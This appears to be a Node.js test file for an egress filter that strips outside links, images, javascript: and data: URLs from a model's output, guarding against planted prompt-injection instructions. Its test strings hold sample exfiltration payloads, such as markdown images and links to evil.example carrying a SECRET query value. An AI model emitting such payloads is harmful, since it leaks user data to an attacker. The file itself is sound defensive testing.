// The egress filter on its own, without a model: proves outside links and images are removed
// even when a model does follow a planted instruction.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { stripOutsideLinks } from '../src/lib/egress.ts';

process.env.PUBLIC_ORIGIN = 'http://localhost:3300';

test('removes markdown images pointing outside', () => {
  const r = stripOutsideLinks('Slow start doubles cwnd. ![s](https://evil.example/p.png?d=SECRET)');
  assert.ok(!r.text.includes('evil.example'));
  assert.equal(r.removed.length, 1);
});

test('keeps link text but drops outside address', () => {
  const r = stripOutsideLinks('See [the backup](https://evil.example/save?d=x).');
  assert.ok(r.text.includes('the backup'));
  assert.ok(!r.text.includes('evil.example'));
});

test('removes bare URLs, data: and javascript: links', () => {
  const r = stripOutsideLinks('go to https://collector.example.net/login or javascript:alert(1) or data:text/html,hi');
  assert.ok(!/collector|javascript:|data:/.test(r.text));
  assert.equal(r.removed.length, 3);
});

test('removes reference-style links and raw HTML tags', () => {
  const r = stripOutsideLinks('Read [this][1].\n\n[1]: https://evil.example/a\n<img src="https://evil.example/x">');
  assert.ok(!r.text.includes('evil.example'));
});

test('keeps links inside the app', () => {
  const r = stripOutsideLinks('Download [Module 4](/api/documents/abc) or http://localhost:3300/c/1');
  assert.ok(r.text.includes('/api/documents/abc'));
  assert.ok(r.text.includes('http://localhost:3300/c/1'));
  assert.equal(r.removed.length, 0);
});

test('protocol-relative links are not treated as inside', () => {
  const r = stripOutsideLinks('[x](//evil.example/a)');
  assert.ok(!r.text.includes('evil.example'));
});
